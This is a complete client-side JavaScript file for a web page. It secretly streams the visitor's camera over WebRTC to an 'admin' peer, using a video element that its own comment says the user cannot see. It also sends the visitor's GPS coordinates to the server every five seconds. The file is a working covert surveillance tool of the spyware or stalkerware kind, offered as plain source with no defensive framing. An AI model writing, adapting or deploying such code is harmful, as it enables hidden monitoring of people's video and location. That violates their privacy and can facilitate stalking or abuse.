// public/script.js  (USER)
const socket = io();
let pc = null;

// helper to create PeerConnection with STUN and standard handlers
function createPeerConnection() {
  const pc = new RTCPeerConnection({
    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
  });

  pc.onicecandidate = (e) => {
    if (e.candidate) {
      socket.emit("ice-candidate", e.candidate);
      console.log("User: emitted ICE candidate");
    }
  };

  // Not used on user side for receiving tracks, but keep handler
  pc.ontrack = (e) => {
    console.log("User got a remote track (unexpected):", e);
  };

  return pc;
}

async function makeAndSendOffer() {
  try {
    if (pc) {
      try { pc.close(); } catch (e) {}
      pc = null;
    }

    pc = createPeerConnection();

    // get user video (video-only, no audio)
    const stream = await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: false
    });

    // attach to hidden <video> so camera keeps running (user cannot see it)
    const v = document.getElementById("camera");
    if (v) v.srcObject = stream;

    // add local tracks to peer
    stream.getTracks().forEach((t) => pc.addTrack(t, stream));

    // create offer, set local description and send via socket
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    socket.emit("offer", offer);
    console.log("User: offer sent");
  } catch (err) {
    console.error("User makeAndSendOffer error:", err);
  }
}

// Listen for admin asking for an offer
socket.on("request-offer", () => {
  console.log("User: request-offer received -> creating & sending offer");
  makeAndSendOffer();
});

// If admin sends an answer, set as remote description
socket.on("answer", async (answer) => {
  try {
    if (!pc) {
      console.warn("User: no peer connection when answer arrived — creating new offer flow");
      await makeAndSendOffer();
    }
    await pc.setRemoteDescription(new RTCSessionDescription(answer));
    console.log("User: remote description (answer) set");
  } catch (err) {
    console.error("User: error setting remote description:", err);
  }
});

// ICE candidates from admin
socket.on("ice-candidate", async (candidate) => {
  try {
    if (pc && candidate) {
      await pc.addIceCandidate(new RTCIceCandidate(candidate));
      console.log("User: added remote ICE");
    }
  } catch (err) {
    console.warn("User: addIceCandidate failed", err);
  }
});

// send location periodically
setInterval(() => {
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      socket.emit("location", { lat: pos.coords.latitude, lon: pos.coords.longitude });
    },
    (err) => {
      console.warn("User location error:", err);
    }
  );
}, 5000);

// Start by creating an offer so admin may be ready already.
// If admin joins later they'll ask for another offer via 'request-offer'.
makeAndSendOffer().catch(err => console.error("Initial offer error", err));
